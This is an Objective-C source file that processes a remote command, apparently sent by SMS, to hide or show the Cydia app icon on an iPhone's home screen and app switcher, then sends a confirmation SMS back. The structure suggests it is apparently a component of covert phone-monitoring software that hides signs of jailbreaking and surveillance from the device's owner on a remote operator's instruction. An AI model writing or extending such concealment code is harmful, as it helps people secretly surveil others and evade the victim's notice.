//
//  SetCydiaVisibilityProcessor.m
//  RCM
//
//  Created by Makara Khloth on 2/26/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SetCydiaVisibilityProcessor.h"
#import "RemoteCmdUtils.h"
#import "PrefVisibility.h"
#import "AppVisibility.h"

@interface SetCydiaVisibilityProcessor (private)
- (void) setCydiaVisibilityException;
- (void) sendReplySMS;
@end

@implementation SetCydiaVisibilityProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetCydiaVisibilityProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: SetCydiaVisibilityProcessor object
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"SetCydiaVisibilityProcessor---->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetCydiaVisibilityProcessor
 - Argument list and description: 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"SetCydiaVisibilityProcessor---->doProcessingCommand");
	if ([[mRemoteCmdData mArguments] count] >= 3) {
		NSString *hide = [[mRemoteCmdData mArguments] objectAtIndex:2];
		if ([RemoteCmdProcessorUtils isZeroOrOneFlag:hide]) {
			id <PreferenceManager> preferenceManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
			PrefVisibility *prefVis = (PrefVisibility *)[preferenceManager preference:kVisibility];
			NSMutableArray *viss = [[NSMutableArray alloc] initWithArray:[prefVis mVisibilities]];
			
			Visible *vis = [[Visible alloc] init];
			[vis setMBundleIdentifier:@"com.saurik.Cydia"];
			if ([hide isEqualToString:@"1"]) {
				[vis setMVisible:YES];
			} else {
				[vis setMVisible:NO];
			}
			
			BOOL newVis = YES;
			for (Visible *v in viss) {
				if ([[v mBundleIdentifier] isEqualToString:[vis mBundleIdentifier]]) {
					[v setMVisible:[vis mVisible]];
					newVis = NO;
					break;
				}
			}
			if (newVis) [viss addObject:vis];
			[vis release];
			
			// Set to preference
			[prefVis setMVisibilities:viss];
			[viss release];
			[preferenceManager savePreference:prefVis];
			DLog (@"prefVis mVisible = %d, mVisibilities = %@", [prefVis mVisible], [prefVis mVisibilities]);
			
			// Hide these invisible applications
			id <AppContext> applicationContext = [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
			id <AppVisibility> visibility = [applicationContext getAppVisibility];
			[visibility hideApplicationIconFromAppSwitcherSpringBoard:[prefVis hiddenBundleIdentifiers]];
			[visibility showApplicationIconInAppSwitcherSpringBoard:[prefVis shownBundleIdentifiers]];
			[visibility applyAppVisibility];
			
			[self sendReplySMS];
		} else {
			[self setCydiaVisibilityException];
		}
	} else {
		[self setCydiaVisibilityException];
	}
}

/**
 - Method name: setCydiaVisibilityException
 - Purpose:This method is invoked when there is an invalid argument failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) setCydiaVisibilityException {
	DLog (@"SetCydiaVisibilityProcessor---->setCydiaVisibilityException")
	FxException* exception = [FxException exceptionWithName:@"SetCydiaVisibilityProcessor" andReason:@"Set Cydia visibility Error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"SetCydiaVisibilityProcessor--->sendReplySMS")
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *replyMessage = nil;
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue] == 1) {
		replyMessage = NSLocalizedString(@"kSetCydiaVisibilitySuccessMSG1", @"");
	} else {
		replyMessage = NSLocalizedString(@"kSetCydiaVisibilitySuccessMSG2", @"");
	}
	replyMessage = [messageFormat stringByAppendingString:replyMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:replyMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:replyMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is invoked when object is released
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) dealloc {
	[super dealloc];
}

@end
